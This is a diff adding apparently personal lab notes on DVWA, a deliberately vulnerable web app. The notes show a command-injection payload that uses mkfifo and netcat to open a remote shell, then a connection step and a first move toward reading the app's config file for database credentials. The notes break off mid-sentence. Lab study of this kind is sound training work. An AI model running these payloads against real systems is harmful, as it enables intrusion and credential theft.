@@ -1,0 +1,29 @@
+USING COMMAND INJECTION TO OBTAIN A REVERSE SHELL:
+
+make sure dvwa security level is set to low
+click on command injection
+[ ; mkfifo /tmp/pipe; sh /tmp/pipe | nc -l 6666 > /tmp/pipe & ]
+    ';': ends ping command
+    "mkfifo /tmp/pipe;": makes a new first in first out file in /tmp/ called pipe, /tmp/pipe
+1 = "sh /tmp/pipe": create a new shell which takes commands reads commands from /tmp/pipe
+2 = "nc -l 6666 > /tmp/pipe": start netcat and set a listener on port 6666, redirect and write all incoming traffic to /tmp/pipe
+        this is what allows the shell to accept remote commands
+    "$1 | $2": unix pipe the output of "sh /tmp/pipe" to netcat, this is what lets the attacker see the output of their remote commands
+    '&': run this command in the background so the website functionality is not disrupted
+
+Once this has been submitted to the form we can connect from the remote machine
+
+    $ nc <dvwa_ip> 6666
+
+We should see nothing at this point
+
+    whoami
+
+This should either print "www-data" or "apache", signifying that we are in the server running DVWA
+
+
+SQL EXPLORATION ONCE WE HAVE A REVERSE SHELL:
+
+To find the sql username and password, cat the contents in /var/www/html/DVWA-master/config/config.inc.php
+
+    to 
